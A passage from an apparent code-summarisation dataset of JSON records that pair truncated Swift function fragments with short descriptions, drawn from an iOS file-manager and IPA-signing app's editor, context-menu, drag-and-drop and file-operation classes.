    "code": "private func navigateToDirectory(_ directoryURL: URL) {\nactivityIndicator.startAnimating()\n\n// Save current directory to stack\nif let currentDir = currentDirectory {",
    "nl": "/ Navigate into a subdirectory / - Parameter directoryURL: The URL of the directory to navigate into",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2546",
    "code": "@objc private func navigateBack() {\nguard !directoryStack.isEmpty else { return }",
    "nl": "/ Navigate back to the previous directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2547",
    "code": "@objc private func reloadContents() {\nguard let currentDir = currentDirectory else { return }",
    "nl": "/ Reload the current directory contents",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2548",
    "code": "@objc private func cleanupTempDirectory() {\n// Remove observer\nNotificationCenter.default.removeObserver(self, name: UIApplication.willTerminateNotification, object: nil)\n\n// Clean up temp directory\nif let tempDir = tempDirectory, fileManager.fileExists(atPath: tempDir.path) {",
    "nl": "/ Remove temporary directory when done",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2549",
    "code": "@objc private func showIPAInfo() {\nactivityIndicator.startAnimating()\n\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Show information about the IPA file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2550",
    "code": "private func findInfoPlist() -> URL? {\nguard let tempDir = tempDirectory else { return nil }",
    "nl": "/ Find the Info.plist file in the IPA / - Returns: URL of the Info.plist if found, nil otherwise",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2551",
    "code": "private func showIPAInfoAlert(fileAttributes: [FileAttributeKey: Any], appInfo: [String: Any]) {\nvar message = \"\"\n\n// File info\nif let fileSize = fileAttributes[.size] as? UInt64 {",
    "nl": "/ Display an alert with IPA information / - Parameters: /   - fileAttributes: File attributes of the IPA /   - appInfo: Contents of Info.plist if available",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2552",
    "code": "private func openFile(_ fileURL: URL) {\nlet fileExtension = fileURL.pathExtension.lowercased()\n\nswitch fileExtension {",
    "nl": "MARK: - Actions / Opens a file using appropriate editor based on file type / - Parameter fileURL: The URL of the file to open",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2553",
    "code": "private func presentAlert(title: String, message: String) {\nlet alert = UIAlertController(\ntitle: title,\nmessage: message,\npreferredStyle: .alert\n)\n\nlet okAction = UIAlertAction(title: \"OK\", style: .default)\nalert.addAction(okAction)\n",
    "nl": "/ Present an alert with a title and message / - Parameters: /   - title: Alert title /   - message: Alert message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2554",
    "code": "func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn contents.count\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2555",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"Cell\", for: indexPath)\nlet fileURL = contents[indexPath.row]\n\n// Configure cell\ncell.textLabel?.text = fileURL.lastPathComponent\n\n// Determine if it's a directory\nvar isDirectory: ObjCBool = false\nif fileManager.fileExists(atPath: fileURL.path, isDirectory: &isDirectory) && isDirectory.boolValue {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2556",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet selectedURL = contents[indexPath.row]\n\n// Check if it's a directory\nvar isDirectory: ObjCBool = false\nif fileManager.fileExists(atPath: selectedURL.path, isDirectory: &isDirectory) && isDirectory.boolValue {",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2557",
    "code": "func tableView(_: UITableView, accessoryButtonTappedForRowWith indexPath: IndexPath) {\nlet fileURL = contents[indexPath.row]\n\n// Show file info\ndo {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2558",
    "code": "class PlistEditorViewController: BaseEditorViewController {\n/// Flag to enable plist syntax validation\nprivate var validateSyntax = true\n\noverride func viewDidLoad() {",
    "nl": "/ Editor for property list (plist) files with syntax highlighting and validation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2559",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\n// Set specific accessibility label for plist files\ntextView.accessibilityLabel = \"Plist Editor\"\n\n// Configure text view for plist editing\ntextView.autocorrectionType = .no\ntextView.autocapitalizationType = .none\ntextView.smartDashesType = .no",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2560",
    "code": "override func loadFileContent() {\n// Use the base implementation but check file type first\nif fileURL.pathExtension.lowercased() != \"plist\" {",
    "nl": "Function loadFileContent - implements loadfilecontent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2561",
    "code": "override func saveChanges() {\n// Optionally validate before saving\nif validateSyntax {",
    "nl": "Function saveChanges - implements savechanges functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2562",
    "code": "private func validatePlistContent() -> Bool {\nguard let text = textView.text else { return false }",
    "nl": "MARK: - Plist-specific functionality / Validates that the content is a valid property list / - Returns: True if valid, false otherwise",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2563",
    "code": "@objc private func validatePlist() {\nif validatePlistContent() {",
    "nl": "/ Validates the plist content and shows result",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2564",
    "code": "@objc private func toggleValidation() {\nvalidateSyntax = !validateSyntax\npresentAlert(\ntitle: \"Validation \" + (validateSyntax ? \"Enabled\" : \"Disabled\"),\nmessage: validateSyntax ?\n\"Plist will be validated before saving.\" :\n\"Plist will be saved without validation.\"\n)\n}\n}",
    "nl": "/ Toggle syntax validation on save",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/PlistEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2565",
    "code": "class TextEditorViewController: BaseEditorViewController {\noverride func viewDidLoad() {",
    "nl": "class TextEditorViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/TextEditorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2566",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\n// Set specific accessibility label for text files\ntextView.accessibilityLabel = \"Text Editor\"\n\n// Customize for text editing\ntextView.autocorrectionType = .no\ntextView.autocapitalizationType = .none\ntextView.smartDashesType = .no",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/TextEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2567",
    "code": "@objc private func toggleLineNumbers() {\n// This would implement line numbers in a production app\n// For now, just show an alert that this feature is coming\npresentAlert(\ntitle: \"Line Numbers\",\nmessage: \"Line numbers feature will be available in a future update.\"\n)\n\n// Provide haptic feedback\nHapticFeedbackGenerator.generateHapticFeedback(style: .medium)",
    "nl": "MARK: - Additional Text Editor Features",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/TextEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2568",
    "code": "extension HomeViewController {\n// Note: All drag and drop methods have been moved to FileDragAndDrop.swift\n// to avoid duplicate method declarations\n}\n",
    "nl": "Extension to add protocol conformance to HomeViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Extensions/HomeViewControllerExtensions.swift",
    "code_type": "extension"
  },
  {
    "id": "2569",
    "code": "extension HomeViewController {\n// MARK: - File Creation Methods\n\n/// Creates a new file in the specified directory\n/// - Parameter directory: The directory to create the file in\nfunc createNewFile(in directory: File) {",
    "nl": "Extension to add extra methods needed by the HomeViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Extensions/HomeViewExtras.swift",
    "code_type": "extension"
  },
  {
    "id": "2570",
    "code": "func createNewFile(in directory: File) {\nguard directory.isDirectory else { return }",
    "nl": "MARK: - File Creation Methods / Creates a new file in the specified directory / - Parameter directory: The directory to create the file in",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Extensions/HomeViewExtras.swift",
    "code_type": "function"
  },
  {
    "id": "2571",
    "code": "func createNewFolder(in directory: File) {\nguard directory.isDirectory else { return }",
    "nl": "/ Creates a new folder in the specified directory / - Parameter directory: The directory to create the folder in",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Extensions/HomeViewExtras.swift",
    "code_type": "function"
  },
  {
    "id": "2572",
    "code": "class FileContextMenu: NSObject, UIContextMenuInteractionDelegate {\n// MARK: - Properties\n\n/// The view controller that owns this menu\nprivate weak var viewController: UIViewController?\n\n/// The file this menu is for\nprivate var file: File\n\n/// Callback for when a file action is performed",
    "nl": "class FileContextMenu - implements functionality related to file context menu",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "class"
  },
  {
    "id": "2573",
    "code": "func contextMenuInteraction(_: UIContextMenuInteraction,\nconfigurationForMenuAtLocation _: CGPoint) -> UIContextMenuConfiguration?\n{",
    "nl": "MARK: - UIContextMenuInteractionDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2574",
    "code": "private func createContextMenu() -> UIMenu {\nvar actions: [UIAction] = []\n\n// Open action - always available\nactions.append(UIAction(\ntitle: \"Open\",\nimage: UIImage(systemName: \"arrow.up.forward.app\"),\nhandler: { [weak self] _ in",
    "nl": "MARK: - Menu Creation / Creates the context menu for the file / - Returns: A UIMenu with actions appropriate for the file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2575",
    "code": "private func shareFile(_ viewController: UIViewController) {\nlet activityViewController = UIActivityViewController(activityItems: [file.url], applicationActivities: nil)\n\n// For iPad support\nif let popoverController = activityViewController.popoverPresentationController {",
    "nl": "MARK: - Action Handlers / Share a file using the system share sheet / - Parameter viewController: The view controller to present from",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2576",
    "code": "private func renameFile(_: UIViewController) {\n// Using HomeViewController's rename method directly as it's implemented there\n}\n\n/// Compress a file\n/// - Parameter viewController: The view controller to present from\nprivate func compressFile(_ viewController: UIViewController) {",
    "nl": "/ Rename a file / - Parameter viewController: The view controller to present from",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2577",
    "code": "private func compressFile(_ viewController: UIViewController) {\nlet zipURL = file.url.deletingPathExtension().appendingPathExtension(\"zip\")\n\n// Check if zip already exists\nif FileManager.default.fileExists(atPath: zipURL.path) {",
    "nl": "/ Compress a file / - Parameter viewController: The view controller to present from",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2578",
    "code": "private func compressDirectory(_ viewController: UIViewController) {\nlet zipURL = file.url.appendingPathExtension(\"zip\")\n\n// Check if zip already exists\nif FileManager.default.fileExists(atPath: zipURL.path) {",
    "nl": "/ Compress a directory / - Parameter viewController: The view controller to present from",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2579",
    "code": "private func performCompression(_ viewController: UIViewController, zipURL: URL) {\n// Show activity indicator\nlet activityIndicator = UIActivityIndicatorView(style: .large)\nactivityIndicator.center = viewController.view.center\nactivityIndicator.startAnimating()\nviewController.view.addSubview(activityIndicator)\n\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Perform the actual compression / - Parameters: /   - viewController: The view controller to present from /   - zipURL: The URL of the zip file to create",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2580",
    "code": "private func editFile(_ viewController: UIViewController) {\nlet fileExtension = file.url.pathExtension.lowercased()\n\nif fileExtension == \"plist\" {",
    "nl": "/ Edit a text file / - Parameter viewController: The view controller to present from",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2581",
    "code": "private func signIPA(_ viewController: UIViewController) {\n// Open the IPA editor\nlet editor = IPAEditorViewController(fileURL: file.url)\nviewController.navigationController?.pushViewController(editor, animated: true)\n}\n}\n\n/// Extension to add long press context menu to table view cells\nextension UITableViewCell {",
    "nl": "/ Sign an IPA file / - Parameter viewController: The view controller to present from",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2582",
    "code": "extension UITableViewCell {\n/// Add a context menu to this cell for a file\n/// - Parameters:\n///   - file: The file to create a menu for\n///   - viewController: The view controller that owns this menu\n///   - onActionPerformed: Callback for when a file action is performed\nfunc addContextMenu(for file: File, in viewController: UIViewController, onActionPerformed: @escaping () -> Void) {",
    "nl": "/ Extension to add long press context menu to table view cells",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "extension"
  },
  {
    "id": "2583",
    "code": "func addContextMenu(for file: File, in viewController: UIViewController, onActionPerformed: @escaping () -> Void) {\n// Remove any existing interactions to avoid duplicates\nfor interaction in interactions {",
    "nl": "/ Add a context menu to this cell for a file / - Parameters: /   - file: The file to create a menu for /   - viewController: The view controller that owns this menu /   - onActionPerformed: Callback for when a file action is performed",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileContextMenu.swift",
    "code_type": "function"
  },
  {
    "id": "2584",
    "code": "extension HomeViewController {\n// MARK: - UITableViewDragDelegate\n\nfunc tableView(_: UITableView, itemsForBeginning session: UIDragSession, at indexPath: IndexPath) -> [UIDragItem] {",
    "nl": "extension HomeViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift",
    "code_type": "extension"
  },
  {
    "id": "2585",
    "code": "func tableView(_: UITableView, itemsForBeginning session: UIDragSession, at indexPath: IndexPath) -> [UIDragItem] {\n// Get the file at the index path\nlet file = searchController.isActive ? filteredFileList[indexPath.row] : fileList[indexPath.row]\n\n// Check if file exists\nguard FileManager.default.fileExists(atPath: file.url.path) else {",
    "nl": "MARK: - UITableViewDragDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift",
    "code_type": "function"
  },
  {
    "id": "2586",
    "code": "func tableView(_ tableView: UITableView, performDropWith coordinator: UITableViewDropCoordinator) {\n// Handle internal reordering\nif coordinator.session.hasItemsConforming(toTypeIdentifiers: [UTType.url.identifier]) {",
    "nl": "MARK: - UITableViewDropDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift",
    "code_type": "function"
  },
  {
    "id": "2587",
    "code": "func handleExternalDrop(_ dropItem: UITableViewDropItem, coordinator _: UITableViewDropCoordinator) {\n// Check for URLs\nif dropItem.dragItem.itemProvider.hasItemConformingToTypeIdentifier(UTType.url.identifier) {",
    "nl": "Function handleExternalDrop - implements handleexternaldrop functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift",
    "code_type": "function"
  },
  {
    "id": "2588",
    "code": "func tableView(_: UITableView, dropSessionDidUpdate session: UIDropSession,\nwithDestinationIndexPath _: IndexPath?) -> UITableViewDropProposal\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileDragAndDrop.swift",
    "code_type": "function"
  },
  {
    "id": "2589",
    "code": "enum FileOperationError: Error {\ncase fileNotFound(String)\ncase invalidDestination(String)\ncase unknownError(String)\ncase permissionDenied(String)\n}\n\nclass FileOperations {",
    "nl": "enum FileOperationError - implements functionality related to file operation error",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "enum"
  },
  {
    "id": "2590",
    "code": "class FileOperations {\nstatic let fileManager = FileManager.default\n\nstatic func copyFile(at sourceURL: URL, to destinationURL: URL) throws {",
    "nl": "class FileOperations - implements functionality related to file operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "class"
  },
  {
    "id": "2591",
    "code": "static func copyFile(at sourceURL: URL, to destinationURL: URL) throws {\nguard fileManager.fileExists(atPath: sourceURL.path) else {",
    "nl": "Function copyFile - implements copyfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2592",
    "code": "static func moveFile(at sourceURL: URL, to destinationURL: URL) throws {\nguard fileManager.fileExists(atPath: sourceURL.path) else {",
    "nl": "Function moveFile - implements movefile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2593",
    "code": "static func deleteFile(at fileURL: URL) throws {\nguard fileManager.fileExists(atPath: fileURL.path) else {",
    "nl": "Function deleteFile - deletes file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2594",
    "code": "static func renameFile(at sourceURL: URL, to destinationURL: URL) throws {\nguard fileManager.fileExists(atPath: sourceURL.path) else {",
    "nl": "Function renameFile - implements renamefile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2595",
    "code": "static func createDirectory(at directoryURL: URL) throws {\ndo {",
    "nl": "Function createDirectory - creates directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2596",
    "code": "static func fileExists(at path: String) -> Bool {\nreturn fileManager.fileExists(atPath: path)\n}\n\nstatic func fileSize(at fileURL: URL) -> UInt64? {",
    "nl": "Function fileExists - implements fileexists functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2597",
    "code": "static func fileSize(at fileURL: URL) -> UInt64? {\ndo {",
    "nl": "Function fileSize - implements filesize functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2598",
    "code": "static func creationDate(at fileURL: URL) -> Date? {\ndo {",
    "nl": "Function creationDate - implements creationdate functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2599",
    "code": "static func unzipFile(at sourceURL: URL, to destinationURL: URL) throws {\nguard fileManager.fileExists(atPath: sourceURL.path) else {",
    "nl": "Function unzipFile - implements unzipfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2600",
    "code": "static func hexEditFile(at fileURL: URL, in viewController: UIViewController) {\nguard fileManager.fileExists(atPath: fileURL.path) else {",
    "nl": "Function hexEditFile - implements hexeditfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2601",
    "code": "static func openIPA(at fileURL: URL, in viewController: UIViewController) {\nguard fileManager.fileExists(atPath: fileURL.path) else {",
    "nl": "Function openIPA - implements openipa functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/FileOperations.swift",
    "code_type": "function"
  },
  {
    "id": "2602",
    "code": "protocol FileHandlingDelegate: AnyObject {\nvar documentsDirectory: URL { get }",
    "nl": "protocol FileHandlingDelegate - implements functionality related to file handling delegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "protocol"
  },
  {
    "id": "2603",
    "code": "func loadFiles()\nfunc present(_ viewControllerToPresent: UIViewController, animated flag: Bool, completion: (() -> Void)?)\n}\n\nclass HomeViewFileHandlers {",
    "nl": "Function loadFiles - implements loadfiles functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2604",
    "code": "func present(_ viewControllerToPresent: UIViewController, animated flag: Bool, completion: (() -> Void)?)\n}\n\nclass HomeViewFileHandlers {",
    "nl": "Function present - implements present functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2605",
    "code": "class HomeViewFileHandlers {\nprivate let fileManager = FileManager.default\nprivate let utilities = HomeViewUtilities()\nprivate let logger = Logger(subsystem: \"com.example.FileNexus\", category: \"FileHandlers\")\n\nfunc uploadFile(viewController: FileHandlingDelegate) {",
    "nl": "class HomeViewFileHandlers - implements functionality related to home view file handlers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "class"
  },
  {
    "id": "2606",
    "code": "func uploadFile(viewController: FileHandlingDelegate) {\nlet documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: [.data, .archive, .text])\ndocumentPicker.delegate = viewController as? UIDocumentPickerDelegate\ndocumentPicker.modalPresentationStyle = .formSheet\nviewController.present(documentPicker, animated: true, completion: nil)\n}\n\nfunc importFile(viewController: FileHandlingDelegate) {",
    "nl": "Function uploadFile - implements uploadfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2607",
    "code": "func importFile(viewController: FileHandlingDelegate) {\nlet documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: [.data, .archive, .text])\ndocumentPicker.delegate = viewController as? UIDocumentPickerDelegate\ndocumentPicker.modalPresentationStyle = .formSheet\nviewController.present(documentPicker, animated: true, completion: nil)\n}\n\nfunc createNewFolder(\nviewController: FileHandlingDelegate,\nfolderName: String,",
    "nl": "Function importFile - implements importfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2608",
    "code": "func createNewFolder(\nviewController: FileHandlingDelegate,\nfolderName: String,\ncompletion: @escaping (Result<URL, Error>) -> Void\n) {",
    "nl": "Function createNewFolder - creates newfolder",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2609",
    "code": "func createNewFile(\nviewController: FileHandlingDelegate,\nfileName: String,\ncompletion: @escaping (Result<URL, Error>) -> Void\n) {",
    "nl": "Function createNewFile - creates newfile",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2610",
    "code": "func unzipFile(\nviewController: FileHandlingDelegate,\nfileURL: URL,\ndestinationName: String,\nprogressHandler: ((Double) -> Void)? = nil,\ncompletion: @escaping (Result<URL, Error>) -> Void\n) {",
    "nl": "Function unzipFile - implements unzipfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2611",
    "code": "func shareFile(viewController: UIViewController, fileURL: URL) {\nlet activityController = UIActivityViewController(activityItems: [fileURL], applicationActivities: nil)\n\n// For iPad support\nif let popoverController = activityController.popoverPresentationController {",
    "nl": "Function shareFile - implements sharefile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Operations/HomeViewFileHandlers.swift",
    "code_type": "function"
  },
  {
    "id": "2612",
    "code": "class HomeViewTableHandlers {\nprivate let utilities: HomeViewUtilities\n\ninit(utilities: HomeViewUtilities) {",
    "nl": "class HomeViewTableHandlers - implements functionality related to home view table handlers",
    "language": "swift",
    "folder": "iOS",
